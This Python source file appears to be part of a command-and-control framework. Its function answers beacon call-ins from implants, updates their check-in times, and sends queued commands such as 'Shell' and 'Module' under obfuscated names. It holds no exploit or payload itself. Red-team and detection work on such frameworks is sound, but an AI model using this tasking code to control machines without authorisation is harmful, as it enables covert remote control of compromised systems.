
import time
import json
import colorama
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler

from Modules.global_objects import beacon_list, command_list, logger, obfuscation_map


def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
    """
    Handles beacon call-ins, updating beacon status and sending commands.
    Args:
        handler (BaseHTTPRequestHandler): The HTTP request handler
        match (dict): Regex match object for the request path
    Returns:
        None
    """
    logger.info(f"Beacon call-in from {handler.path}")

    query_components = parse_qs(urlparse(handler.path).query)
    beacon_id = query_components.get('session', [None])[0]

    if not beacon_id:
        logger.error("No session ID provided in beacon call-in.")
        handler.send_response(400)
        handler.end_headers()
        return

    beacon = beacon_list.get(beacon_id)
    if not beacon:
        logger.error(f"Beacon with ID {beacon_id} not found.")
        handler.send_response(404)
        handler.end_headers()
        return

    # Update beacon timestamps and notify UI
    beacon.last_beacon = time.asctime()
    beacon.next_beacon = time.asctime(time.localtime(time.time() + beacon.timer))
    logger.info(f"Beacon {beacon_id} updated. Next check-in: {beacon.next_beacon}")

    # Check for commands to send
    commands_to_send = []
    # Safely get commands mapping from obfuscation_map
    command_obf = obfuscation_map.get("generic", {}).get("commands", {})
    # Create a snapshot of the command list to avoid "dictionary changed size during iteration" error
    command_items = list(command_list.items())
    for cmd_id, command in command_items:
        if command.beacon_uuid == beacon_id and not command.executed:
            command.output = "Sent to beacon, waiting for response."
            obfuscated_command = None
            try:
                # Try top-level lookup case-insensitively
                obf_entry = obfuscation_map.get(command.command) or obfuscation_map.get(command.command.lower())
                if obf_entry is None:
                    generic_commands = obfuscation_map.get("generic", {}).get("commands", {})
                    obf_entry = generic_commands.get(command.command) or generic_commands.get(command.command.lower())
                if isinstance(obf_entry, dict):
                    obfuscated_command = obf_entry.get('obfuscation_name') or obf_entry.get('module_name')
                    if obfuscated_command is None:
                        logger.error(f"Obfuscation entry for command '{command.command}' missing expected name keys")
                        continue
                elif isinstance(obf_entry, str):
                    obfuscated_command = obf_entry
                else:
                    logger.error(f"Obfuscation entry for command '{command.command}' is missing or has unexpected type: {type(obf_entry)}")
                    continue
            except Exception as e:
                logger.error(f"Error obfuscating command '{command.command}': {e}")
                continue
            commands_to_send.append({
                command_obf.get("command_uuid"): cmd_id,
                command_obf.get("command"): obfuscated_command,
                command_obf.get("data"): getattr(command, "command_data", None)
            })
            command.executed = True
            
            # Update database status to "Received" when beacon picks up the command
            if beacon.database:
                try:
                    beacon.database.update_entry(
                        "beacon_commands",
                        "command_output=?",
                        ("Received",),
                        "command_uuid=?",
                        (cmd_id,)
                    )
                    logger.info(f"Command {cmd_id} ({command.command}) picked up by beacon {beacon_id}")
                    print(f"{colorama.Fore.CYAN}[RECEIVED]{colorama.Fore.WHITE} Command {colorama.Fore.BLUE}{cmd_id}{colorama.Fore.WHITE} ({colorama.Fore.MAGENTA}{command.command}{colorama.Fore.WHITE}) picked up by beacon")
                except Exception as e:
                    logger.error(f"Failed to update command status to 'Received': {e}")
                    
        if command.command == "Module":
            command.data = "Module Sent"
        if command.command == "Shell":
            command.data = "Shell Sent"

    none_key = command_obf.get("none").get("obfuscation_name")
    response_data = {command_obf.get("obfuscation_name"): commands_to_send} if commands_to_send else {none_key: none_key}
    response_body = json.dumps(response_data).encode('utf-8')

    handler.send_response(200)
    handler.send_header('Content-Type', 'application/json')
    handler.send_header('Content-Length', str(len(response_body)))
    handler.end_headers()
    handler.wfile.write(response_body)
